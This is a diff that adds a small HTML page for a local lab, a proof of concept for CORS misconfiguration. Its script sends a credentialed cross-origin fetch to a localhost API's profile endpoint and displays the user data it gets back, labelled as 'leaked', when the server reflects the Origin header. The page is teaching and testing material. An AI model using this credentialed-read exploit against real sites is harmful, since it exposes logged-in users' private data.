@@ -1,0 +1,66 @@
+<!doctype html>
+<html>
+  <head>
+    <title>CORS Lab — Cross-Origin Read Test</title>
+    <style>
+      body {
+        font-family: monospace;
+        max-width: 600px;
+        margin: 40px auto;
+      }
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      pre {
+        background: #f0f0f0;
+        padding: 15px;
+        white-space: pre-wrap;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>CORS Misconfiguration — Lab PoC</h2>
+    <p>
+      This page is intentionally served from a <strong>different origin</strong> (e.g.
+      <code>http://localhost:8000</code>) than the lab API (<code>http://localhost:5000</code>).
+      Different port = different origin in browser terms, even on the same machine.
+    </p>
+    <p>
+      Make sure you've visited
+      <a href="http://localhost:5000/login" target="_blank">http://localhost:5000/login</a>
+      first to get a session cookie, then click the button below.
+    </p>
+    <button onclick="testCors()">Attempt Cross-Origin Read</button>
+    <pre id="output">Click the button to test...</pre>
+
+    <script>
+      function testCors() {
+        const out = document.getElementById('output')
+        out.textContent = 'Sending cross-origin request with credentials...'
+
+        fetch('http://localhost:5000/api/profile', {
+          credentials: 'include',
+        })
+          .then((r) => r.json())
+          .then((data) => {
+            out.textContent =
+              'VULNERABLE: cross-origin read SUCCEEDED.\n\n' +
+              'Leaked data:\n' +
+              JSON.stringify(data, null, 2) +
+              '\n\nThis page (a different origin) was able to read the ' +
+              "logged-in user's data because the server reflected our " +
+              'Origin header and allowed credentials.'
+          })
+          .catch((err) => {
+            out.textContent =
+              'BLOCKED (this is the secure/expected behavior): ' +
+              err +
+              '\n\nThe browser refused to let this page read the response ' +
+              "because the server's CORS policy didn't trust this origin."
+          })
+      }
+    </script>
+  </body>
+</html>
